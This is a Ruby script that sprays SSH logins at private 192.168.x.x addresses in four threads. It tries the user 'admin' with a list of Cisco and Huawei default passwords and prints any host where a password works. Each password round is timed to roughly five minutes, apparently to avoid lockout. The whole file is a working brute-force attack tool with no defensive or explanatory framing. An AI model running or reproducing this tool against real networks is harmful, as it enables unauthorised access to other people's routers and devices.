require 'bundler/inline'
require 'date'
gemfile do
  source 'https://rubygems.org'
  gem 'net-ssh'
end

LOGIN = 'admin'.freeze
PASSWORDS = %w[Cisco123 cisco123 Cisco123! cisco123 Admin@huawei admin@huawei D33vice].freeze

tr1 = Thread.new do
  PASSWORDS.each do |pwd|
    start_time = DateTime.now
    (1..64).each do |i|
      (1..64).each do |j|
        host = "192.168.#{i}.#{j}"
        begin
          Net::SSH.start(host, LOGIN, password: pwd, timeout: 5) do |_ssh|
            puts "host: #{host} password: #{pwd}"
          end
        rescue StandardError => e
          puts "err: #{e}"
        end
      end
    end
    diff = ((DateTime.now - start_time) * 24 * 60 * 60).to_i
    sleep(310 - diff) if diff < 310
  end
end

tr2 = Thread.new do
  PASSWORDS.each do |pwd|
    start_time = DateTime.now
    (65..128).each do |i|
      (65..128).each do |j|
        host = "192.168.#{i}.#{j}"
        begin
          Net::SSH.start(host, LOGIN, password: pwd, timeout: 5) do |_ssh|
            puts "host: #{host} password: #{pwd}"
          end
        rescue StandardError => e
          puts "err: #{e}"
        end
      end
    end
    diff = ((DateTime.now - start_time) * 24 * 60 * 60).to_i
    sleep(310 - diff) if diff < 310
  end
end

tr3 = Thread.new do
  PASSWORDS.each do |pwd|
    start_time = DateTime.now
    (129..192).each do |i|
      (129..192).each do |j|
        host = "192.168.#{i}.#{j}"
        begin
          Net::SSH.start(host, LOGIN, password: pwd, timeout: 5) do |_ssh|
            puts "host: #{host} password: #{pwd}"
          end
        rescue StandardError => e
          puts "err: #{e}"
        end
      end
    end
    diff = ((DateTime.now - start_time) * 24 * 60 * 60).to_i
    sleep(310 - diff) if diff < 310
  end
end

tr4 = Thread.new do
  PASSWORDS.each do |pwd|
    start_time = DateTime.now
    (193..254).each do |i|
      (193..254).each do |j|
        host = "192.168.#{i}.#{j}"
        begin
          Net::SSH.start(host, LOGIN, password: pwd, timeout: 5) do |_ssh|
            puts "host: #{host} password: #{pwd}"
          end
        rescue StandardError => e
          puts "err: #{e}"
        end
      end
    end
    diff = ((DateTime.now - start_time) * 24 * 60 * 60).to_i
    sleep(310 - diff) if diff < 310
  end
end

tr1.join
tr2.join
tr3.join
tr4.join